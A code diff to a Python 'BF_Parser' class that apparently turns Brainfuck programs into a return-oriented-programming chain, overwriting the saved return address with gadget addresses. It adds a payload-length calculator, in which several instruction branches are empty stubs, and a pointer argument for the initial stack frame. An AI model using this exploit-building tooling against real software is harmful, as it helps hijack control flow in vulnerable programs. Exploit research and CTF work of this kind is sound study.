@@ -29,10 +29,35 @@ class BF_Parser():
         data = [s11, s10, s9, s8, s7, s6, s5, s4, s3, s2, s1, s0, ra]
         self.__charger.set_stack_frame(offset + data)
 
-    def parse(self):
-        # initialize a3 to the middle of the tape
-        initial_value = 0x41414141 # for debugging
-        self.__construct_charger(ra=self.__init_a3.get_vaddr(), s4=self.__charger.get_vaddr(), s7=initial_value)
+    def get_payload_len(self):
+        # return the number of bytes of the generated rop chain
+        charger_frame_sz = 432
+        total_len = 8 + charger_frame_sz # for the initialization
+
+        for instruction in self.__bf_code:
+            if instruction == '>' or instruction == '<' or instruction == '+':
+                total_len += charger_frame_sz
+
+            elif instruction == '-':
+                pass
+
+            elif instruction == '.':
+                pass
+
+            elif instruction == ',':
+                pass
+
+            elif instruction == '[':
+                pass
+
+            elif instruction == ']':
+                pass
+
+        return total_len
+
+    def parse(self, pointer_start):
+        # initialize a3 to point to the middle of the tape
+        self.__construct_charger(ra=self.__init_a3.get_vaddr(), s4=self.__charger.get_vaddr(), s7=pointer_start)
 
         rop_chain = self.__charger.print_vaddr() # charger address that overrides $ra
         rop_chain += self.__charger.print_gadget() # charger frame
